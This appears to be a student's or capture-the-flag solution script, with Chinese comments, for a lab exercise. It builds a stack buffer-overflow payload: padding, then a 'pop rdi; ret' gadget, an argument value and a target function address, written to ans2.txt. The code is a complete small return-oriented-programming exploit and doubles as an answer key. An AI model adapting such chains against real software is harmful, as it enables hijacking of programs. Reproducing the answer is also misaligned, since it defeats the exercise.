import struct

# 1. 辅助函数：将整数转为64位小端序字节
def p64(val):
    return struct.pack('<Q', val)

# 2. 关键地址
pop_rdi_ret_addr = 0x4012c7  # Gadget: pop rdi; ret
func2_addr       = 0x401216  # 目标函数 func2
arg_val          = 0x3f8     # 题目要求的参数值

# 3. 构造 Payload
offset = 16  # 8 bytes buffer + 8 bytes saved rbp
padding = b'A' * offset

# ROP Chain
rop = p64(pop_rdi_ret_addr) + p64(arg_val) + p64(func2_addr)

payload = padding + rop

# 4. 写入文件
filename = "ans2.txt"
with open(filename, "wb") as f:
    f.write(payload)

print(f"[+] Payload written to {filename}")
print(f"[+] Padding: {offset}")
print(f"[+] Gadget: {hex(pop_rdi_ret_addr)}")
print(f"[+] Arg: {hex(arg_val)}")
print(f"[+] Target: {hex(func2_addr)}")